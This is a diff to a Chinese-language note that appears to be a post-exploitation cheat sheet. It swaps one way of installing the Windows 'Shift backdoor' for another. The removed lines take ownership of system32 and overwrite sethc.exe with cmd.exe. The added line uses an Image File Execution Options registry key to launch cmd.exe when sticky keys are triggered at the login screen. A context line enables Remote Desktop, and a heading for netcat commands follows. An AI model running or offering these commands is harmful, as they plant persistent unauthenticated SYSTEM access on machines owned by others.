@@ -25,22 +25,9 @@ REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnec
 
 ### Shift 后门
 
-Windows2008/Win7 需要先执行（把 system32 的所有权限赋予 administrator ）：
+推荐使用修改注册表方式（镜像劫持）
 
-    takeown /f c:\windows\system32\*.*   /a /r /d y
-    cacls  c:\windows\system32\*.*  /T /E /G administrators:F
-
-安装
-
-    copy c:\windows\system32\sethc.exe c:\windows\system32\sethc.exe.bak
-    copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe 
-    copy c:\windows\system32\cmd.exe c:\windows\system32\dllcache\sethc.exe  
-
-清除
-
-    copy c:\windows\system32\sethc.exe.bak c:\windows\system32\sethc.exe
-    del c:\windows\system32\sethc.exe.bak
-    del c:\windows\system32\dllcache\sethc.exe  
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v debugger /t REG_SZ /d "%SystemRoot%\system32\cmd.exe"
 
 
 ### NC 命令
